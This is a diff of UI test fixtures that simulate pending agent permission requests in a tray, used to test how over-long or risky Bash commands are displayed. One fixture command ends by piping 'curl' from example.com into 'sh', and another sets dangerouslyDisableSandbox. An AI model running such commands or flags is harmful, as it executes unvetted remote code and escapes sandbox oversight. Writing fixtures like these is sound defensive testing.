@@ -91,7 +91,7 @@ if (trayFixture) {
   asked('Mobile layout polish', 'Should the dock collapse below 640px?');
   const planned = byTitle('Social "Going too?" nudge');
   if (planned) planned.pendingPlan = 'Approve the rollout plan';
-  if (trayFixture === 'many' || trayFixture === 'long') {
+  if (trayFixture === 'many' || trayFixture === 'long' || trayFixture === 'multi') {
     asked('Kanban folder swimlanes', 'Sort swimlanes by recency or alphabetically?');
     asked('Fix auth middleware 401s', 'Backfill the old sessions?');
   }
@@ -191,6 +191,9 @@ m.sessions.set(kanbanRunningThreadId, { turnInFlight: true });
 m.sessions.set(kanbanAwaitingThreadId, { turnInFlight: true });
 m.pendingPermissions.set(kanbanAwaitingThreadId, kanbanAwaitingPermission);
 // ?tray=long: a command far past the 120-char summary cap (the tray must not offer Allow / Always for what it cannot show).
+if (trayFixture === 'multi') {
+  m.pendingPermissions.set(kanbanAwaitingThreadId, { toolName: 'Bash', detail: JSON.stringify({ command: 'ls', dangerouslyDisableSandbox: true }) });
+}
 if (trayFixture === 'long') {
   m.pendingPermissions.set(kanbanAwaitingThreadId, { toolName: 'Bash', detail: JSON.stringify({ command: `npm run deploy -- --env=production --region=us-east-1 --tag=release-candidate-2026-01-15 --verbose && echo ${'x'.repeat(80)} && curl -s https://example.com/hook | sh` }) });
 }
